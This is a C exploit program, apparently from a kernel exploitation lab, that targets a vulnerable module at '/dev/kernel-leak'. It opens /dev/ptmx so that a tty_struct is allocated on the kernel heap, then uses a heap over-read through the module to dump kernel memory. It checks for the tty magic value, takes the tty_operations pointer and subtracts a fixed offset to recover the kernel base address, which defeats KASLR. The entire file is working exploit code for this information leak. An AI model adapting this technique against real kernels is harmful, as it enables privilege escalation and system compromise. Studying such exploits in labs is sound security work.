#define _GNU_SOURCE
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define KERN_MODULE "/dev/kernel-leak"

#define WORD_SIZE 8
#define BUF_SIZE 0x500

#define TTY_MAGIC 0x5401

void exit_and_log(char *msg) {
  fprintf(stderr, "%s", msg);
  exit(-1);
}

unsigned long do_leak(int fd) {
  int bytes_read;
  unsigned long *buf = NULL;
  unsigned long kernel_base = 0;
  unsigned int leak_offset = 128;
  unsigned int tty_offset = 131;

  buf = malloc(BUF_SIZE);
  if (buf == NULL)
    exit_and_log("Failed to malloc\n");

  memset(buf, '\x00', BUF_SIZE);

  bytes_read = read(fd, buf, BUF_SIZE);

  for (int i = 0; i < (BUF_SIZE / WORD_SIZE); i++) {
    if (i == leak_offset) {
      if ((buf[i] & 0xffff) == TTY_MAGIC) {
        printf("buf + 0x%X\t: %lX <------- tty_struct magic\n", i * WORD_SIZE,
               buf[i]);
      } else {
        printf("buf + 0x%X\t: %lX <------- leak failed\n", i * WORD_SIZE,
               buf[i]);
        break;
      }
     }
    else if (i == tty_offset) {
        printf("buf + 0x%X\t: %lX <------- tty_operations\n", i * WORD_SIZE,
               buf[i]);
        // Offset is 0xFFFFFFFFA966B880 - 0xffffffffa8600000
        kernel_base = buf[i] - 0x106b880; 
      }
    else {
        printf("buf + 0x%X\t: %lX\n", i * WORD_SIZE, buf[i]);
      }
    }

    free(buf);

    return kernel_base;
  }

  void main() {

    int fd;
    unsigned long kernel_base;

    /*
     struct tty_struct {
     int magic;
     struct kref kref;
     struct device *dev;
     struct tty_driver *driver;
     const struct tty_operations *ops; <-- want to leak this
     ...
     */

    // This will allocate our kernel buffer
    fd = open(KERN_MODULE, O_RDWR);
    if (fd < 0)
      exit_and_log("Failed to open kernel module\n");

    // Opening this character device will allocate a
    // tty_struct on the heap for us. We can use a
    // heap overread to leak out
    int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    kernel_base = do_leak(fd);

    printf("Found kernel base address at %lX\n", kernel_base);

    close(fd);
  }